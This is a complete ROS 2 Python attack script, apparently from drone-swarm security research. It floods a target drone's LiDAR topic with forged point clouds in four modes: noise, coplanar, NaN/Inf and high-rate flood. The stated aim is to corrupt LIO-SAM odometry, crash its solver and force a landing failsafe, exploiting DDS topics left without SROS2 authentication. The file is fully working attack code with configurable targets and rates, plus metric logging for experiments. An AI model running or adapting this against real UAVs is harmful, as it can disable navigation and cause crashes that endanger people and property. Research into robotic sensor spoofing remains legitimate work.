#!/usr/bin/env python3
"""
Layer 2 Attack: LiDAR Denial of Service — LIO-SAM Crash / Odometry Corruption

Publishes malicious point clouds directly on the target drone's LiDAR topic.
LIO-SAM receives BOTH the real scans and the injected garbage. When it tries
to register degenerate/noise clouds against the existing map, the scan-to-map
ICP diverges, corrupting odometry. Repeated failures cause the GTSAM factor
graph to accumulate inconsistent constraints, leading to:

  1. "Large velocity" warnings → odometry resets
  2. gtsam::IndeterminantLinearSystemException → LIO-SAM crash
  3. If LIO-SAM crashes → vision pose pipeline dies → EKF variance grows
     → FS_EKF_THRESH exceeded → LAND failsafe

Attack modes:
  - noise:      Random 3D noise clouds — ICP converges to wrong transform
  - degenerate: All points on a single plane — underconstrained optimization
  - corrupt:    NaN/Inf coordinates — crash PCL/GTSAM solvers
  - flood:      Massive clouds (200K+ points) at high rate — CPU starvation

The attacker only needs to PUBLISH on the DDS topic (SROS2 disabled).
No interception or MITM required.

Usage:
  ros2 run swarm_mission lidar_dos --ros-args \
    -p target_drone:=drone1 \
    -p mode:=noise \
    -p injection_rate:=20.0 \
    -p attack_duration:=30.0

Output:
  - CSV: ~/lidar_dos_metrics_<drone>_<timestamp>.csv
"""
import csv
import math
import os
import struct
import time
from datetime import datetime

import numpy as np
import rclpy
from rclpy.node import Node
from rclpy.qos import QoSProfile, ReliabilityPolicy, HistoryPolicy, DurabilityPolicy
from sensor_msgs.msg import PointCloud2, PointField, Imu
from geometry_msgs.msg import PoseStamped


class LidarDos(Node):
    def __init__(self):
        super().__init__('lidar_dos')

        # ---- Parameters ----
        self.declare_parameter('target_drone', 'drone1')
        self.declare_parameter('mode', 'noise')             # noise | degenerate | corrupt | flood
        self.declare_parameter('injection_rate', 20.0)       # Hz (real VLP-16 = 10 Hz)
        self.declare_parameter('baseline_duration', 10.0)
        self.declare_parameter('attack_duration', 60.0)
        self.declare_parameter('recovery_duration', 30.0)
        self.declare_parameter('num_points', 50000)          # points per injected cloud
        self.declare_parameter('noise_range', 50.0)          # meters, spread of random points
        self.declare_parameter('output_dir', os.path.expanduser('~'))

        self.target_drone = self.get_parameter('target_drone').value
        self.mode = self.get_parameter('mode').value
        self.injection_rate = self.get_parameter('injection_rate').value
        self.baseline_dur = self.get_parameter('baseline_duration').value
        self.attack_dur = self.get_parameter('attack_duration').value
        self.recovery_dur = self.get_parameter('recovery_duration').value
        self.num_points = self.get_parameter('num_points').value
        self.noise_range = self.get_parameter('noise_range').value
        self.output_dir = self.get_parameter('output_dir').value

        # ---- Topics ----
        # Publish on the SAME topic LIO-SAM reads from (after deskew relay)
        self.lidar_topic = f'/{self.target_drone}/lidar/points'

        if self.target_drone == 'drone1':
            self.local_pos_topic = '/mavros/local_position/pose'
        else:
            self.local_pos_topic = f'/{self.target_drone}/mavros/local_position/pose'

        self.imu_topic = f'/{self.target_drone}/imu/data'

        # ---- State ----
        self.phase = 'baseline'
        self.phase_start_time = None
        self.inject_timer = None
        self.inject_count = 0
        self.drone_pose = None
        self.attack_origin = None
        self.latest_imu_stamp = None
        self.latest_real_cloud = None   # for matching frame_id and field layout

        # Metrics
        self.metrics = []
        self.metric_interval = 1.0
        self.last_metric_time = 0.0

        # ---- QoS ----
        # Match the deskew relay / bridge QoS
        qos_besteffort = QoSProfile(
            reliability=ReliabilityPolicy.BEST_EFFORT,
            history=HistoryPolicy.KEEP_LAST,
            durability=DurabilityPolicy.VOLATILE,
            depth=5)

        qos_reliable = QoSProfile(
            reliability=ReliabilityPolicy.RELIABLE,
            history=HistoryPolicy.KEEP_LAST,
            durability=DurabilityPolicy.VOLATILE,
            depth=5)

        # Subscribe to real LiDAR to get frame_id and field layout
        self.lidar_sub = self.create_subscription(
            PointCloud2, self.lidar_topic,
            self.lidar_callback, qos_besteffort)

        # Subscribe to IMU for sim-time timestamps
        self.imu_sub = self.create_subscription(
            Imu, self.imu_topic,
            self.imu_callback, qos_besteffort)

        # Monitor drone position
        self.pose_sub = self.create_subscription(
            PoseStamped, self.local_pos_topic,
            self.pose_callback, qos_besteffort)

        # Publisher — the attack vector
        # Use RELIABLE to ensure LIO-SAM's subscriber gets every message
        self.pc_pub = self.create_publisher(
            PointCloud2, self.lidar_topic, qos_reliable)

        # Phase timer
        self.phase_timer = self.create_timer(0.5, self.phase_tick)

        # CSV
        timestamp_str = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.csv_path = os.path.join(
            self.output_dir,
            f'lidar_dos_metrics_{self.target_drone}_{timestamp_str}.csv')

        mode_desc = {
            'noise': f'NOISE ({self.num_points} random points, range={self.noise_range}m)',
            'degenerate': f'DEGENERATE ({self.num_points} coplanar points)',
            'corrupt': f'CORRUPT ({self.num_points} NaN/Inf points)',
            'flood': f'FLOOD ({self.num_points} points, CPU starvation)',
        }.get(self.mode, self.mode)

        self.get_logger().info(
            f'=== LiDAR Denial of Service Attack ===\n'
            f'  Target: {self.target_drone}\n'
            f'  LiDAR topic: {self.lidar_topic}\n'
            f'  Mode: {mode_desc}\n'
            f'  Injection rate: {self.injection_rate} Hz\n'
            f'  Phases: baseline={self.baseline_dur}s, '
            f'attack={self.attack_dur}s, recovery={self.recovery_dur}s\n'
            f'  CSV: {self.csv_path}\n'
            f'  Waiting for first real LiDAR scan...')

        self.phase_start_time = time.monotonic()

    # ---- Callbacks ----

    def lidar_callback(self, msg: PointCloud2):
        self.latest_real_cloud = msg

    def imu_callback(self, msg: Imu):
        self.latest_imu_stamp = msg.header.stamp

    def pose_callback(self, msg: PoseStamped):
        self.drone_pose = msg.pose

    # ---- Point cloud generation ----

    def _build_fields(self):
        """Build PointField list matching VLP-16 format with deskew time field."""
        fields = [
            PointField(name='x', offset=0, datatype=PointField.FLOAT32, count=1),
            PointField(name='y', offset=4, datatype=PointField.FLOAT32, count=1),
            PointField(name='z', offset=8, datatype=PointField.FLOAT32, count=1),
            PointField(name='intensity', offset=12, datatype=PointField.FLOAT32, count=1),
            PointField(name='ring', offset=16, datatype=PointField.UINT16, count=1),
            # Padding to align to 4 bytes
        ]
        # If real cloud has a 'time' field (from deskew relay), include it
        if self.latest_real_cloud is not None:
            for f in self.latest_real_cloud.fields:
                if f.name == 'time':
                    fields.append(PointField(
                        name='time', offset=20, datatype=PointField.FLOAT32, count=1))
                    break
        return fields

    def _get_point_step(self):
        """Get point_step matching the real scan format."""
        if self.latest_real_cloud is not None:
            return self.latest_real_cloud.point_step
        # Default: x(4) + y(4) + z(4) + intensity(4) + ring(2) + pad(2) + time(4) = 24
        return 24

    def _generate_cloud(self):
        """Generate a malicious point cloud based on attack mode."""
        n = self.num_points
        point_step = self._get_point_step()

        if self.mode == 'noise':
            # Random 3D noise spread over a large volume
            # These points don't match the real environment, so ICP will
            # converge to a wrong transform or fail to converge
            x = np.random.uniform(-self.noise_range, self.noise_range, n).astype(np.float32)
            y = np.random.uniform(-self.noise_range, self.noise_range, n).astype(np.float32)
            z = np.random.uniform(-self.noise_range/2, self.noise_range/2, n).astype(np.float32)

        elif self.mode == 'degenerate':
            # All points on a single XY plane at z=0
            # Makes the 6-DOF optimization underconstrained in Z, roll, pitch
            x = np.random.uniform(-20.0, 20.0, n).astype(np.float32)
            y = np.random.uniform(-20.0, 20.0, n).astype(np.float32)
            z = np.zeros(n, dtype=np.float32) + np.random.normal(0, 0.01, n).astype(np.float32)

        elif self.mode == 'corrupt':
            # Mix of NaN, Inf, and very large values
            # Can crash PCL functions that don't check for NaN
            x = np.full(n, np.nan, dtype=np.float32)
            y = np.full(n, np.nan, dtype=np.float32)
            z = np.full(n, np.nan, dtype=np.float32)
            # Some Inf values
            quarter = n // 4
            x[:quarter] = np.inf
            y[:quarter] = -np.inf
            z[:quarter] = np.inf
            # Some very large values
            x[quarter:quarter*2] = np.float32(1e30)
            y[quarter:quarter*2] = np.float32(-1e30)
            z[quarter:quarter*2] = np.float32(1e30)

        elif self.mode == 'flood':
            # Dense cloud with plausible-looking geometry but wrong structure
            # Sphere of points — heavy processing load for ICP
            theta = np.random.uniform(0, 2 * np.pi, n).astype(np.float32)
            phi = np.random.uniform(-np.pi/2, np.pi/2, n).astype(np.float32)
            r = np.random.uniform(1.0, 40.0, n).astype(np.float32)
            x = (r * np.cos(phi) * np.cos(theta)).astype(np.float32)
            y = (r * np.cos(phi) * np.sin(theta)).astype(np.float32)
            z = (r * np.sin(phi)).astype(np.float32)

        else:
            self.get_logger().error(f'Unknown mode: {self.mode}')
            return None

        # Pack into PointCloud2 binary format
        intensity = np.full(n, 100.0, dtype=np.float32)
        ring = np.random.randint(0, 16, n, dtype=np.uint16)
        time_field = np.linspace(0.0, 0.1, n, dtype=np.float32)  # 0-100ms sweep

        buf = bytearray(n * point_step)
        for i in range(n):
            base = i * point_step
            struct.pack_into('<f', buf, base + 0, x[i])
            struct.pack_into('<f', buf, base + 4, y[i])
            struct.pack_into('<f', buf, base + 8, z[i])
            if point_step >= 16:
                struct.pack_into('<f', buf, base + 12, intensity[i])
            if point_step >= 18:
                struct.pack_into('<H', buf, base + 16, ring[i])
            if point_step >= 24:
                # time field at offset 20 (after ring + 2 bytes padding)
                struct.pack_into('<f', buf, base + 20, time_field[i])

        return bytes(buf), n, point_step

    def publish_injection(self):
        """Publish a malicious point cloud."""
        if self.latest_imu_stamp is None:
            return

        result = self._generate_cloud()
        if result is None:
            return

        data, n_points, point_step = result

        msg = PointCloud2()
        msg.header.stamp = self.latest_imu_stamp
        msg.header.frame_id = (
            self.latest_real_cloud.header.frame_id
            if self.latest_real_cloud is not None
            else f'{self.target_drone}/lidar_link')

        msg.height = 1
        msg.width = n_points
        msg.fields = self._build_fields()
        msg.is_bigendian = False
        msg.point_step = point_step
        msg.row_step = point_step * n_points
        msg.data = data
        msg.is_dense = (self.mode != 'corrupt')  # NaN clouds are not dense

        self.pc_pub.publish(msg)
        self.inject_count += 1

    # ---- Phase management ----

    def phase_tick(self):
        now = time.monotonic()
        elapsed = now - self.phase_start_time

        displacement = None
        if self.attack_origin is not None and self.drone_pose is not None:
            dx = self.drone_pose.position.x - self.attack_origin.position.x
            dy = self.drone_pose.position.y - self.attack_origin.position.y
            dz = self.drone_pose.position.z - self.attack_origin.position.z
            displacement = math.sqrt(dx**2 + dy**2 + dz**2)

        # Log metrics
        if now - self.last_metric_time >= self.metric_interval:
            self.last_metric_time = now
            metric = {
                'timestamp': datetime.now().isoformat(),
                'phase': self.phase,
                'phase_elapsed_s': round(elapsed, 2),
                'inject_count': self.inject_count,
                'displacement_m': round(displacement, 3) if displacement is not None else None,
            }
            if self.drone_pose is not None:
                metric['drone_x'] = round(self.drone_pose.position.x, 3)
                metric['drone_y'] = round(self.drone_pose.position.y, 3)
                metric['drone_z'] = round(self.drone_pose.position.z, 3)

            self.metrics.append(metric)

            phase_char = {'baseline': '[B]', 'attack': '[A]', 'recovery': '[R]'}.get(self.phase, '[?]')
            pos_str = ''
            if self.drone_pose is not None:
                pos_str = (f'pos: ({self.drone_pose.position.x:.1f}, '
                           f'{self.drone_pose.position.y:.1f}, '
                           f'{self.drone_pose.position.z:.1f})')
            disp_str = f'disp: {displacement:.2f}m' if displacement is not None else ''

            self.get_logger().info(
                f'{phase_char} {elapsed:.0f}s | {pos_str} | '
                f'{disp_str} | injected: {self.inject_count}')

        # Phase transitions
        if self.phase == 'baseline' and elapsed >= self.baseline_dur:
            if self.latest_real_cloud is None:
                self.get_logger().warn('Still waiting for real LiDAR scan — extending baseline...')
                return
            self._start_attack()
        elif self.phase == 'attack' and elapsed >= self.attack_dur:
            self._start_recovery()
        elif self.phase == 'recovery' and elapsed >= self.recovery_dur:
            self._finish()

    def _start_attack(self):
        self.phase = 'attack'
        self.phase_start_time = time.monotonic()

        if self.drone_pose is not None:
            from geometry_msgs.msg import Pose
            self.attack_origin = Pose()
            self.attack_origin.position.x = self.drone_pose.position.x
            self.attack_origin.position.y = self.drone_pose.position.y
            self.attack_origin.position.z = self.drone_pose.position.z

        period = 1.0 / self.injection_rate
        self.inject_timer = self.create_timer(period, self.publish_injection)

        self.get_logger().warn(
            f'=== ATTACK PHASE — Injecting {self.mode} point clouds '
            f'at {self.injection_rate} Hz ===\n'
            f'  Points per cloud: {self.num_points}\n'
            f'  Target: {self.lidar_topic}')

    def _start_recovery(self):
        self.phase = 'recovery'
        self.phase_start_time = time.monotonic()

        if self.inject_timer is not None:
            self.inject_timer.cancel()
            self.destroy_timer(self.inject_timer)
            self.inject_timer = None

        self.get_logger().warn('=== RECOVERY PHASE — Injection stopped ===')

    def _finish(self):
        self.phase = 'done'
        self.phase_timer.cancel()
        self._write_csv()

        attack_disps = [m['displacement_m'] for m in self.metrics
                        if m['phase'] == 'attack' and m['displacement_m'] is not None]
        max_disp = max(attack_disps) if attack_disps else 0
        final_disp = attack_disps[-1] if attack_disps else 0

        min_z = None
        for m in self.metrics:
            if m['phase'] in ('attack', 'recovery') and 'drone_z' in m:
                if min_z is None or m['drone_z'] < min_z:
                    min_z = m['drone_z']

        min_z_str = f'{min_z:>6.2f}m' if min_z is not None else '  N/A '

        self.get_logger().warn(
            f'\n'
            f'╔═══════════════════════════════════════════╗\n'
            f'║       LIDAR DOS ATTACK RESULTS            ║\n'
            f'╠═══════════════════════════════════════════╣\n'
            f'║ Target: {self.target_drone:<34}║\n'
            f'║ Mode: {self.mode:<36}║\n'
            f'║ Injection rate:       {self.injection_rate:>6.0f} Hz           ║\n'
            f'║ Total injected clouds:{self.inject_count:>6d}              ║\n'
            f'║ Max displacement:     {max_disp:>6.2f}m             ║\n'
            f'║ Final attack disp:    {final_disp:>6.2f}m             ║\n'
            f'║ Min altitude:         {min_z_str}             ║\n'
            f'╚═══════════════════════════════════════════╝\n'
            f'\n'
            f'CSV saved: {self.csv_path}')

    def _write_csv(self):
        if not self.metrics:
            return
        fieldnames = ['timestamp', 'phase', 'phase_elapsed_s', 'inject_count',
                      'displacement_m', 'drone_x', 'drone_y', 'drone_z']
        try:
            with open(self.csv_path, 'w', newline='') as f:
                writer = csv.DictWriter(f, fieldnames=fieldnames, extrasaction='ignore')
                writer.writeheader()
                writer.writerows(self.metrics)
            self.get_logger().info(f'Wrote {len(self.metrics)} rows to {self.csv_path}')
        except Exception as e:
            self.get_logger().error(f'Failed to write CSV: {e}')


def main(args=None):
    rclpy.init(args=args)
    node = LidarDos()
    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        if node.phase != 'done':
            node.get_logger().warn('Interrupted — writing partial metrics...')
            node._write_csv()
        node.get_logger().info(
            f'Shutting down — {node.inject_count} clouds injected')
    finally:
        if node.inject_timer is not None:
            node.inject_timer.cancel()
        node.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()
